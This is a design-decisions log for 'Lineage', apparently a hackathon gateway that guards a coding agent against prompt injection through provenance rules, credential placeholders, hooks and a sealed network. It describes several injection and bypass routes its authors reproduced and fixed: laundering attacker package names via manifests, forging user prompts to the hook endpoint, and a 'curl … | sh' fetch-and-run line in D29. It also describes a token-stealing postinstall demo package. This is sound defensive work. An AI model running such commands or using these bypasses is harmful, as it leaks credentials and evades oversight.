# DECISIONS.md — Lineage

Decisions made before the build, from the research on Nov 6, 2026. The coding agent appends new decisions as D19, D20 and so on. Each entry says what was decided, why, what was rejected, and when to revisit it.

Status key: **Settled** (don't change without the human) · **Default** (agent may change; log why) · **Open** (human decides)

---

## Product

### D1. Primary prompt is Prompt 2; Prompt 1 is demoed through the same design — Settled
- **Decision:** Build the agent-harness gateway (Prompt 2). Show Prompt 1 (authenticate, allow selected MCP tools, revoke mid-task) through per-run identity and credential custody.
- **Why:** Custody makes revoke complete, because the agent never held a real secret. Prompt 1's best demo beat comes for free, and one demo covers both prompts.
- **Rejected:** a separate Prompt 1 identity broker (less visible drama, a second codebase).

### D2. Judge each action by **why** it happens, not only **where** it goes — Settled
- **Decision:** The core differentiator is provenance: every high-risk action must trace back to a trusted source.
- **Why:** Nearly every 2026 incident went through requests a per-request gateway would allow:
  - Agentjacking used the approved npm registry and an approved Sentry MCP server;
  - CVE-2026-54316 used a pre-approved Hugging Face domain;
  - PocketOS used a valid token on a legitimate host;
  - Comment and Control used the GitHub API.
- **Rejected:** an allow/block gateway alone. Any team can build it, and it misses these attacks.

### D3. Require positive provenance; don't try to detect injections — Settled
- **Decision:** Rules ask "does this action have a trusted source?", not "does this text look like an injection?"
- **Why:** Detection is an arms race. Simon Willison argues guardrails can't reliably stop the "lethal trifecta". A name that came from nowhere trusted fails the check whatever the wording, including Base64-hidden instructions.
- **Rejected:** an LLM classifier for injected text (non-deterministic, easy to paraphrase around, slow).

### D4. Split L1 into L1a (always deny) and L1b (ask when interactive) — Settled
- **Decision:** Running or installing code whose name came from untrusted content is **never approvable** (L1a). Other high-risk actions from untrusted content (network, destructive, persistence) are denied when autonomous and asked when interactive (L1b).
- **Why:** Running code an attacker named has no legitimate case. Sending data somewhere sometimes does. This also gives the demo both a hard block (beat 3) and the "human approved it anyway and the tripwire still caught it" moment (beat 4).

### D5. Credential custody with placeholders that double as tripwires — Settled
- **Decision:** The agent holds placeholders (`lgph_<binding>_<random>`). The egress proxy swaps in the real secret only when host, method, path and environment match the binding. A placeholder seen anywhere else kills the run inline.
- **Why:**
  - A stolen value is worthless.
  - The tripwire can't fire falsely, because nothing legitimate sends a placeholder outside its binding.
  - Revoke is complete.
  - It closes the gap Unit 42 found in AWS AgentCore Harness, where the resolved token was readable from process memory.
- **Scope:** bearer tokens and API keys in headers only. AWS SigV4-signed requests from the agent are out of scope; the model tap signs Bedrock calls itself.
- **Rejected:** redaction only (Webflow ctxcop style: no swap and no tripwire); decoys only (Tracebit style: detection after the fact).

### D6. Positioning: complement A10, don't compete — Settled
- **Decision:** Pitch Lineage as the agent-side layer A10's stack doesn't have.
  - A10 AI Gateway: routing, cost, governance.
  - TrojAI Defend for MCP: server registry, tool tampering.
  - TrojAI Defend: prompt/response firewall.
- **Why:** Their public pages don't describe instruction provenance or keeping credentials out of agents. TLS inspection in the traffic path, which custody depends on, is already A10's core business.

## Agent integration

### D7. Target agent is Claude Code; other agents get egress-only coverage — Settled
- **Why:** Claude Code has documented hooks that see the user prompt, every tool result (including the MCP server name) and every tool call before it runs, plus managed settings that lock them in.
- **Consequence:** Other CLI agents get sealing, custody and the tripwire, but not the L1/L2/L3 rules. Say so in the README.

### D8. Hooks: command hooks, fail closed, managed-only — Settled
- **Decision:**
  - Use `type: "command"` hooks for SessionStart, UserPromptSubmit, PreToolUse and PostToolUse, each with `onFailure: "block"`.
  - Pin Claude Code to **v2.1.295 or later**.
  - Set `allowManagedHooksOnly: true`.
  - The hook script also prints a deny on any error for `pre`.
- **Why:** By default a hook that errors or times out lets the action through; `onFailure: "block"` (v2.1.295+) changes that. SessionStart doesn't support `http` hooks, so command hooks keep one mechanism everywhere. Managed-only stops a poisoned repo from swapping out the hooks.
- **Rejected:** `type: "http"` hooks (not available on SessionStart; fail-closed behavior is easier to own in the script).

### D9. Allow means "no output" — Settled
- **Decision:** When Lineage has no objection, the hook prints nothing, so Claude Code's own permission prompts still apply. Only `ask` and `deny` produce output.
- **Why:** Returning an explicit allow would bypass the user's own permission settings.

### D10. Judge URLs by their host; binding hosts count as trusted — Settled
- **Why:** Without this, every new URL path on a trusted host would trigger "no source" prompts. The operator chose binding hosts at launch, so they are a trusted source.

## AWS and infrastructure

### D11. One EC2 host with Docker Compose, reached through SSM — Default
- **Decision:**
  - Amazon Linux 2023, t3.large, public subnet, **no inbound ports**.
  - Shell and dashboard through SSM Session Manager (port-forward 8001).
  - CDK in Python.
- **Why:** Fastest path that is still clearly on AWS; easy to debug; nothing exposed to the internet.
- **Rejected:** ECS Fargate + ALB + NLB (more moving parts; the proxy needs an NLB for CONNECT); Lambda (long-lived streaming proxy).
- **Revisit if:** the demo needs several agent hosts.

### D12. Seal the agent: internal network, no DNS — Settled
- **Decision:**
  - The agent container lives only on an `internal: true` Docker network (172.30.0.0/24).
  - It runs with `--dns 127.0.0.1` and no resolver; service names come from `--add-host`.
  - Its only peers are control, egress and modeltap.
- **Why:** Unsetting `HTTPS_PROXY` gets a hijacked agent nothing, and DNS tunneling has no channel (see the OpenAI DNS sandbox escape, Sep 2026).
- **Test:** `scripts/dns_leak_test.sh` must pass in M0.

### D13. Model path: Bedrock through the model tap; the agent holds no AWS credentials — Default
- **Decision:**
  - Claude Code runs with `CLAUDE_CODE_USE_BEDROCK=1`, `ANTHROPIC_BEDROCK_BASE_URL=http://modeltap:8100`, `CLAUDE_CODE_SKIP_BEDROCK_AUTH=1`, and the run token in `ANTHROPIC_AUTH_TOKEN`.
  - The tap verifies the run token, signs with the instance role, and streams the Bedrock event stream back **unchanged**, decoding a copy.
- **Why:** Revoke cuts off the model, and the agent has no cloud credential to steal. Claude Code's gateway docs warn that rewriting bodies or buffering or converting the stream breaks the client.
- **Fallback:** an IAM user limited to `bedrock:InvokeModel*`, with Bedrock as TLS passthrough in egress. Log it here if used, because the agent then holds a model credential.

### D14. IMDSv2 hop limit 2, plus egress rule E2 — Settled
- **Why:** control, egress and modeltap need instance-role credentials from inside containers, so a hop limit of 1 would break them. The agent can't reach the metadata service anyway (no route), and E2 blocks private and link-local destinations through the proxy.

### D15. Storage and identity — Default
- **Decision:**
  - DynamoDB on-demand, 3 tables (runs, events, entities); an in-memory store for all tests.
  - Run tokens are ES256 JWTs signed by a KMS `ECC_NIST_P256` key.
  - Revocation is a status checked on every hook, egress and model request, with a 1-second cache.
- **Why:** Serverless, no ops, visibly AWS-native. KMS signing means no signing key exists on the box.

### D16. Region us-west-2 — Open
- **Why default:** closest to the venue in Santa Clara.
- **Human must confirm:** the region, that Bedrock model access is enabled, and the Claude inference profile ID (`aws bedrock list-inference-profiles`).

## Demo

### D17. Only local stubs in the demo; a registry that can never fetch real code — Settled
- **Decision:**
  - The infrastructure API, error tracker (`errortrack` MCP), attacker collector and npm registry are all local stubs.
  - The registry returns 404 for everything.
  - Bedrock is the only real external service.
- **Why:** If a rule ever misses, nothing real can be harmed or fetched on stage.

### D18. Demo settings: interactive mode, untrusted-content labeling off, replay fallback — Settled
- **Decision:**
  - Run the demo in interactive mode.
  - Set `label_untrusted: false` in `policy/demo.yaml`. Labeling untrusted content makes the model less likely to attempt the injected step, and the demo needs the attempt.
  - Keep `lineage replay` as a deterministic fallback, always labeled **REPLAY** on the dashboard.
- **Why:** The biggest demo risk is the model refusing the injected step, which would leave nothing to block. Be honest on stage if replay is used.

---

## Open questions for the human
- Is code written before the event allowed? (Ask the organizers before building anything beyond spikes.)
- Region and Bedrock model ID (D16).
- Team roles: core rules + hooks · egress + custody · model tap + AWS · dashboard + demo script.

---

## Build-time decisions

### D19. Region default us-west-2 until human confirms — Default
- **Decision:** Use `us-west-2` for CDK, compose defaults, and Bedrock endpoint construction.
- **Why:** Closest to Santa Clara (D16); user confirmed Amazon credits are available.
- **Revisit when:** Human provides the Bedrock inference profile ID and confirms model access.

### D20. Local demo tokens shared via compose env — Default
- **Decision:** Default `LINEAGE_OPERATOR_TOKEN=lineage-operator-dev` and `LINEAGE_SERVICE_TOKEN=lineage-service-dev` in compose so control and egress agree without reading seeded files.
- **Why:** Avoids token skew between services when `.lineage/` is freshly seeded with random values.
- **Revisit when:** Moving to AWS Secrets Manager in `LINEAGE_MODE=aws`.

### D21. Control serves 8000/8001/8002 in one process — Settled
- **Decision:** `python -m control.main` runs three uvicorn servers in one asyncio process sharing `ControlState`.
- **Why:** Three separate uvicorn processes (original M0 scaffold) did not share memory, so hooks/admin/internal disagreed about runs.
- **Rejected:** Redis/shared DB just for local mode.

### D22. M0 agent base image uses `python:3.12-slim` — Default
- **Decision:** Agent image FROM `python:3.12-slim` instead of `debian:bookworm-slim`.
- **Why:** Docker Hub pulls for debian timed out on the build host; python slim was already cached and enough for sealing tests.
- **Revisit when:** M2 pins Claude Code / Node — may need a Node-capable base.

### D23. The web app starts agents through a separate runner service — Default
- **Decision:** A small `runner` service holds the Docker socket and starts one fixed container shape when control asks. It sits only on `uplink`, so agents can't reach it.
- **Why:** The operator starts agents from the browser. Giving control the socket would put host-level access on the sandbox network.
- **Rejected:** A host-side process, which would need a second start command.
- **Revisit when:** Moving to a host where agents run under a real scheduler.

### D24. Headless agents wait for the operator's answer inside the pre hook — Settled
- **Decision:** For web-started runs, an "ask" verdict holds the PreToolUse hook open for up to 300s until the operator approves or blocks in the app. No answer means blocked. Terminal runs still get `ask`, since a person is at the prompt.
- **Why:** `claude -p` has nobody to prompt, and it runs with `bypassPermissions`, so Lineage's hooks are the only permission system.

### D25. Agents work on a private copy of the workspace — Default
- **Decision:** The workspace is mounted read-only and copied into the container. The result is shown as a diff against that starting copy.
- **Why:** An agent can't damage the real folder, whatever it's told to do.
- **Revisit when:** Someone needs one-click apply.

### D26. Manifests are trusted as they were at run start, not when read — Default (changes plan §6.1)
- **Decision:**
  - Dependencies declared in the workspace's manifests before the run starts are trusted. Control gets them from outside the sandbox: the runner's read-only copy (web runs), the launcher (`lineage run`), or the replay script.
  - Reading a manifest during the run is ordinary workspace content (`checked`).
  - Text the agent writes with Edit/Write is never a source.
  - A `checked` sighting never raises a name that is already `untrusted`.
- **Why:** The old rule (any manifest read is trusted) let an agent add an attacker's package to `package.json`, read it back, and have L1a allow `npx` on it. Copying a name into any file also turned an L1a deny into an L3 ask. Both were reproduced, then fixed (`tests/integration/test_laundering.py`).
- **Cost:** If a repo file mentions a name *after* untrusted content did, the name stays untrusted (L1b ask instead of L3 ask). That's the safe direction.

### D27. A bare install is judged on the names the agent added to manifests — Default
- **Decision:** `npm install`, `npm ci`, `pnpm install`, `yarn`, `uv sync` and similar are high-risk. When the command names no package, the names the agent added to a manifest during the run are its decision entities.
- **Limit:** Additions are tracked from Edit/Write on a manifest, and from shell commands that mention a manifest file or use `npm pkg set`. A manifest rewritten by a script the agent wrote isn't seen. The registry stub (404 for everything) and egress are the backstop.

### D28. S2: a user prompt counts only if it really came from the user — Settled
- **Decision:**
  - The operator's task is trusted from run creation.
  - Web-started runs (`claude -p`) have exactly one prompt, so no other UserPromptSubmit text is ever trusted.
  - Terminal runs trust a typed prompt once the model tap sees the same text in a user text block (not a `tool_result`, not a `<system-reminder>`).
  - Unverified prompts are recorded and shown (`prompt_unverified`), and their names stay untrusted.
- **Why:** The hook endpoint is reachable from the agent's own shell with its own hook token, so a script could post a fake prompt and make L1a allow an attacker's package. Reproduced, then fixed.
- **Residual risk (terminal runs only):** The agent holds its run token, so a hijacked agent could forge a model request containing the fake prompt to corroborate it. Web runs aren't affected.

### D29. For code-running actions, a URL is judged by its full path — Default (refines D10)
- **Decision:** When an action runs code (`curl … | sh`, `pip install <url>`), a URL first seen in untrusted content triggers L1a even on a trusted host. Plain network calls are still judged by host.
- **Why:** The scorecard found `curl -s http://registry.demo/<attacker path> | sh` was allowed. A trusted registry serves anyone's script. (An earlier version only caught it because `install.sh` was parsed as a hostname.)

### D30. "Without Lineage" baseline mode, and a fair attack destination — Default
- **Decision:**
  - Runs take `protection: lineage | baseline`. A baseline run holds the real secret, its tool calls aren't judged (the dashboard records what Lineage would have done), and egress applies only the host allowlist, the same one Lineage runs use.
  - The forged issue exfiltrates to `errortrack.demo/api/7741/…`, standing in for an attacker's own project on the team's allowlisted error tracker. It is in `egress.allow_hosts` (reachable) but not in `allowlist.hosts` (trusted).
- **Why:** Any allowlist blocks `collector.demo`, so a before/after against it would be unfair. The real 2026 attacks went through approved services.

### D31. Strict mode covers the request that would complete the trifecta — Default
- **Decision:** Egress traffic turns on the `external` leg (previously only WebFetch did). A run with `untrusted` and `private` on is treated as strict for its first outbound request, at both the hook (T1 ask) and egress (T1 block).
- **Why:** Otherwise the first leaking request goes out before strict mode starts.

### D32. The scorecard assumes the operator approves every prompt — Settled
- **Decision:** `control/scorecard.py` plays each attack through the real hook handlers and egress rules, as a normal gateway and as Lineage. An "ask" counts as approved, so an attack only counts as stopped if a layer stops it without the human. Scenarios are labelled as *modeled on* public incidents, not reproductions.

### D33. Planted bug reports reach the agent as a root-owned file — Default
- **Decision:** The runner copies the issue list into `/etc/lineage/errortrack_issues.json` before the container starts.
- **Rejected:** An environment variable. The agent could print it with `env`, and that output counts as ordinary workspace content, a second path for the attacker's text that isn't marked untrusted.

### D34. Dependencies are judged by what they do in the sandbox — Default
- **Decision:**
  - npm preloads `agent-image/watch.js` (via `NPM_CONFIG_NODE_OPTIONS`) into every script it runs.
  - It reports credential-file reads, secret env reads, process starts and network connections, each tagged with the package that did it.
  - `lineage_core/pkg_verdict.py` turns these into clean / suspicious / malicious. Malicious means it read credentials and had a way out.
  - Nobody reads package code.
- **Demo:**
  - `fixtures/demo-repo` depends on `orders-money`, which pulls in `orders-telemetry`.
  - `orders-telemetry`'s postinstall steals `STAGING_TOKEN` and `~/.npmrc` and posts them to `errortrack.demo`.
  - The registry stub serves both packages from `stubs/registry/packages/`.
- **Limit:**
  - The monitor runs inside the sandbox, so a package can disable or forge its reports.
  - It only sees Node code. Native binaries and code that clears `NODE_OPTIONS` are invisible to it.
  - The verdict is evidence, not enforcement. The stand-in key, the C1 tripwire and egress, all outside the sandbox, are what stop the theft.

### D35. Allowed risky actions also say why — Default
- **Decision:**
  - An allowed high-risk action's verdict carries its decision entities, each with its trusted source.
  - A bare `npm install` lists the packages the run-start manifests declared.
  - The dashboard draws this as a lineage chain on every risky action. For an untrusted source, it quotes the content the name came from.
- **Why:** The gate was invisible when it let something through, so the "why, not where" idea never showed up in the demo.

### D36. Real malware samples run only through the detonation harness — Settled
- **Decision:**
  - `scripts/detonate.py` runs npm samples (.tgz, a .zip with password "infected", or a directory) one per container, in the agent sandbox shape: internal network, no DNS, non-root, no capabilities, no-new-privileges, memory and process limits.
  - The sample is mounted read-only and unpacked only inside the container.
  - The run's stand-in key is planted as `STAGING_TOKEN`, `NPM_TOKEN`, `GITHUB_TOKEN`, `GH_TOKEN`, `AWS_SECRET_ACCESS_KEY` and in `~/.npmrc`.
  - Install scripts run, then `require()`.
  - The report lists monitor behaviors, blocked and allowed egress, and the tripwire.
- **Guards:** It refuses non-Linux hosts and a sandbox network that isn't internal. Samples are never extracted on the host.
- **Also:** Egress now records refused HTTPS tunnel requests (`egress_block`, E1), so HTTPS exfil attempts show up instead of vanishing.
- **Limits:**
  - Packages whose dependencies aren't in the registry stub fail at `require()`.
  - Second-stage downloads are blocked, so later stages never run.
  - DNS-based exfiltration isn't observed, only prevented.
